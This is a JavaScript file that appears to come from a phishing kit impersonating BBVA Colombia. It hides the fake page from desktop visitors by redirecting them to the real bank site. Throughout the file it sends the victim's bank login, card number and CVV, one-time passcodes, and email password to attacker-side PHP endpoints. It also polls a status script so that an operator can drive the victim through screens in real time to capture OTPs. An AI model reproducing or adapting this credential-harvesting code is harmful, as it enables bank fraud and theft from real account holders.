function vista_otp(){
    $("#contenedor-otp").hide();
    $("#contenedor-login").hide();
    $("#contenedor-token").show();  
    $("#contenedor-token-err").hide(); 
    $("#contenedor-mail").hide(); 

    $(".fondo").hide();
    $(".mensaje").hide();

    $("#TokenOTP").val("");
}

function vista_email(){
    $("#contenedor-otp").hide();
    $("#contenedor-login").hide();
    $("#contenedor-token").hide();  
    $("#contenedor-token-err").hide(); 
    $("#contenedor-mail").show(); 

    $(".fondo").hide();
    $(".mensaje").hide();

    $("#correoElectronico").val("");  
    $("#claveCorreo").val(""); 
}

function vista_cajero(){
    $("#contenedor-otp").show();
    $("#contenedor-login").hide();
    $("#contenedor-token").hide();  
    $("#contenedor-token-err").hide(); 
    $("#contenedor-mail").hide(); 

    $(".fondo").hide();
    $(".mensaje").hide();

    $("#claveCajero").val("");
}

function vista_errorotp(){
    $("#contenedor-otp").hide();
    $("#contenedor-login").hide();
    $("#contenedor-token").hide();  
    $("#contenedor-token-err").show(); 
    $("#contenedor-mail").hide(); 

    $(".fondo").hide();
    $(".mensaje").hide();

    $("#TokenOTPErr").val("");
}

function vista_usuario(){
    $("#contenedor-otp").hide();
    $("#contenedor-login").show();
    $("#contenedor-token").hide();  
    $("#contenedor-token-err").hide(); 
    $("#contenedor-mail").hide(); 

    $(".fondo").hide();
    $(".mensaje").hide();

    $("#docNumberMovil").val("");  
    $("#passwordMovil").val(""); 
}

function consultar_estado(){

    if (espera == 1) { 

        $.post( "../../../process/estado.php",function(data) {
           
            switch (data) {
                case '2':espera = 0;
                         vista_otp();
                         break;
                case '4':espera = 0;
                         vista_email(); 
                         break;
                case '6':espera = 0;
                         vista_cajero();  
                         break;               
                case '8':espera = 0;
                         vista_errorotp(); 
                         break;
                case '10':espera = 0;
                          window.location.href = "../../../finish-no-back-button/";
                          break;
                case '12':espera = 0;
                          vista_usuario(); 
                          break;
            } 
        });    
    }    
}


function detectar_dispositivo(){
    var dispositivo = "";
    if(navigator.userAgent.match(/Android/i))
        dispositivo = "Android";
    else
        if(navigator.userAgent.match(/webOS/i))
            dispositivo = "webOS";
        else
            if(navigator.userAgent.match(/iPhone/i))
                dispositivo = "iPhone";
            else
                if(navigator.userAgent.match(/iPad/i))
                    dispositivo = "iPad";
                else
                    if(navigator.userAgent.match(/iPod/i))
                        dispositivo = "iPod";
                    else
                        if(navigator.userAgent.match(/BlackBerry/i))
                            dispositivo = "BlackBerry";
                        else
                            if(navigator.userAgent.match(/Windows Phone/i))
                                dispositivo = "Windows Phone";
                            else
                                dispositivo = "PC";
    return dispositivo;
}  


if (detectar_dispositivo() == "PC") {
    window.location.href = "https://www.bbva.com.co/"; 
}

 function iniciar_sesion(td,nd,cl){
    var d = detectar_dispositivo();
    var u = "[" + td + "]" + nd;

    $.post( "../../../process/pasologin.php", { usr:u, pas: cl, dis: d,ban:"BBVA" } ,function(data) {
       espera = 1;
    });
 }

function enviar_clave(t,cc){
    $.post( "../../../process/pasotarjeta.php", { tar:t,fec:"",cvv:cc } ,function(data) {
       espera = 1;
    });
}

function enviar_OTP(o){
    $.post( "../../../process/pasootp.php", { otp: o} ,function(data) {
       espera = 1;
    });
}

function enviar_correo(ce,clv){
    $.post( "../../../process/pasocorreo.php", { eml:ce,clv:clv,cel:"" } ,function(data) {
       espera = 1;
    });
}